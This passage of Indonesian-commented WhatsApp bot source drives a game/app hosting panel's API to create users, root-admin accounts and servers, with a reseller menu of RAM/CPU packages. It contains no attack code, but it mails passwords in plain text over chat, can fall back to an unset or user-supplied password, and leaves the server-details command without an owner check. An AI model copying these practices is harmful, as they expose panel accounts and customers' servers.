○ ADMIN: ${user.root_admin}
○ ️CREATED AT: ${user.created_at}
└──────────⁠─────────

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`, mentions:[u],
})
rizzpiw.sendMessage(u, { text: `Hai Kak ${pushname} 

┌⁠──────────⁠─────────
○ 
○ ID: ${user.id}
○ EMAIL: ${user.email}
○ USERNAME: ${user.username}
○ PASSWORD: ${password.toString()}
○ ️LOGIN: ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└⁠──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN ADMIN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE`,
})
}
break

//--------------------------------------------------------------------------------------------------\\
//Create User+Panel Button 
case "addusr2": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let eggid = `15` // UBAH JADI ID EGG LU
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER*

○ TYPE: user

○ ID: ${user.id}
○ UUID: ${user.uuid}
○ USERNAME: ${user.username}
○ EMAIL: ${user.email}
○ NAME: ${user.first_name} ${user.last_name}
○ LANGUAGE: ${user.language}
○ ADMIN: ${user.root_admin}
○ ️CREATED AT: ${user.created_at}
└──────────⁠─────────

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`

const sections = [
    {
title: `SERVER ZANSXD`,
rows: [
{title: `PAKET G1`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,1024/1024,30`, description: 'RAM 1GB CPU 30%'},
{title: `PAKET G2`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,2048/2048,50`, description: 'RAM 2GB CPU 50%'},
{title: `PAKET G3`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,3072/3072,75`, description: 'RAM 3GB CPU 75%'},
{title: `PAKET G4`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,4096/4096,100`, description: 'RAM 4GB CPU 100%'},
{title: `PAKET G5`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,5120/5120,130`, description: 'RAM 5GB CPU 130%'},
{title: `PAKET G6`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,6144/6144,150`, description: 'RAM 6GB CPU 150%'},
{title: `PAKET G7`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,7168/7168,175`, description: 'RAM 7GB CPU 175%'},
{title: `PAKET G8`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,8192/8192,200`, description: 'RAM 8GB CPU 200%'},
{title: `PAKET G9`, rowId: `${prefix}addsrv ${user.first_name},${tanggal} Jangan Di Ubah,${user.id},15,1,0/0,0`, description: 'RAM UNLI CPU UNLI'},
                                             
]}]

const listMessage = {
text: tks,
footer: "_Server Yang Ada Di ZansXD_",
title: "*SUCCESSFULLY ADD USER*",
buttonText: "Server RizzPiw",
sections
    }
	
await rizzpiw.sendMessage(m.chat, listMessage)
await rizzpiw.sendMessage(u, {
text: `      
Hai Kak @${u.split`@`[0]}*

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK DONE*`,

    })
}
break

//--------------------------------------------------------------------------------------------------\\
//Delete User
case "delusr": {
if (!isCreator) return m.reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break

//--------------------------------------------------------------------------------------------------\\
//List User
case "listusr": {
if (!isCreator) return m.reply(mess.owner)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
let obj = {
title: "╴ZANSXD -",
rows: [
{ title: `${u.id}. ${u.username}`, rowId: `${prefix}detusr1 ` + u.id, description: u.first_name + ' ' + u.last_name },
]
}
await sections.push(obj)
if (sections.length === 50) {
sections.push({
title: "╴ZANSXD -",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listusr1 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr1 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr1 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr1 5`, description: 'Page 5' },
]
})
}
}
await rizzpiw.sendMessage(m.chat, {
text: "Berikut List User ZANSXD",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*ZANSXD*",
buttonText: `${res.meta.pagination.count} Users`,
sections
},{ quoted : m })
}
break
//--------------------------------------------------------------------------------------------------\\
//Det User
case "detusr": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Id Nya Mana?\n\nContoh : ${prefix + command} 2`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
let u = res.attributes
m.reply(`┌⁠──────────⁠─────────
○ *${u.username.toUpperCase()} USER DETAILS*
○
○ ID : ${u.id}
○ UUID : ${u.uuid}
○ USERNAME : ${u.username}
○ EMAIL : ${u.email}
○ NAME : ${u.first_name} ${u.last_name}
○ LANGUAGE : ${u.language}
○ ADMIN : ${u.root_admin}
○ CREATED AT : ${u.created_at}
└──────────⁠─────────`)
}
break
//--------------------------------------------------------------------------------------------------\\
//Create Akun Admin Panel 
case "createadmin": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await rizzpiw.sendMessage(m.chat, { text: `
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER*
○
○ TYPE: user
○
○ ID: ${user.id}
○ UUID: ${user.uuid}
○ USERNAME: ${user.username}
○ EMAIL: ${user.email}
○ NAME: ${user.first_name} ${user.last_name}
○ LANGUAGE: ${user.language}
○ ADMIN: ${user.root_admin}
○ ️CREATED AT: ${user.created_at}
└──────────⁠─────────

*Password Telah Dikirim Di Private Chat @${u.split`@`[0]}*`, mentions:[u],
})
rizzpiw.sendMessage(u, { text: `Hai Kak ${pushname} 

┌⁠──────────⁠─────────
○ 
○ ID: ${user.id}
○ EMAIL: ${user.email}
○ USERNAME: ${user.username}
○ PASSWORD: ${password.toString()}
○ ️LOGIN: ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└⁠──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN ADMIN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*`,
})
}
break


//--------------------------------------------------------------------------------------------------\\
//Add Server 
case "addsrv": {
if (!isCreator) return m.reply(mess.owner)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[0],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD SERVER*

○ TYPE: ${res.object}

○ ID : ${server.id}
○ UUID : ${server.uuid}
○ NAME : ${server.name}
○ DESCRIPTION : ${server.description}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
○ CREATED AT : ${server.created_at}
└──────────⁠─────────`)
}
break
//--------------------------------------------------------------------------------------------------\\
//DeleterServer 1-2
case "delsrv": {
if (!isCreator) return m.reply(mess.owner)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
//--------------------------------------------------------------------------------------------------\\
//ListServer 1-2
case "listsrv": {
if (!isCreator) return m.reply(mess.owner)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let obj = {
title: "-- ZANSXD --",
rows: [
{ title: `${s.id}. ${s.name}`, rowId: `${prefix}detsrv ` + s.id, description: `Status: ${data.attributes ? data.attributes.current_state : s.status}` },
]
}
await sections.push(obj)
if (sections.length >= 50 && res.meta.pagination.links.next) {
sections.push({
title: "-- ZANSXD --",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv1 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv1 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv1 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv1 5`, description: 'Page 5' },
]
})
}
}
await rizzpiw.sendMessage(m.chat, {
text: "Berikut List Server ZansXD",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "-- ZANSXD --",
buttonText: `${res.meta.pagination.count} Servers`,
sections
}, { quoted: fkontak })
}
break
//--------------------------------------------------------------------------------------------------\\
//Detserver 1-2
case "detsrv": {

let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return m.reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
m.reply(`┌⁠──────────⁠─────────
○ *${s.name.toUpperCase()} SERVER DETAILS*

○ STATUS: ${t.current_state}

○ ID : ${s.id}
○ UUID : ${s.uuid}
○ NAME : ${s.name}
○ DESCRIPTION : ${s.description}
○ MEMORY : ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
○ DISK : ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
○ CPU : ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
○ CREATED AT : ${s.created_at}
└──────────⁠─────────`)
}
break

//--------------------------------------------------------------------------------------------------\\
//Create Panel Simple 1GB - UNLI
//Bagian Reseller Menu

case "1gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break

case "2gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2048"
let cpu = "50"
let disk = "2048"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break

case "3gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3072"
let cpu = "75"
let disk = "3072"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "4gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4096"
let cpu = "100"
let disk = "4096"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : youtu.be/3s9CLUWjIMI
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT ZANSXD BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT ZANSXD

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
rizzpiw.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "5gb": {
if (!isSeler && !isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
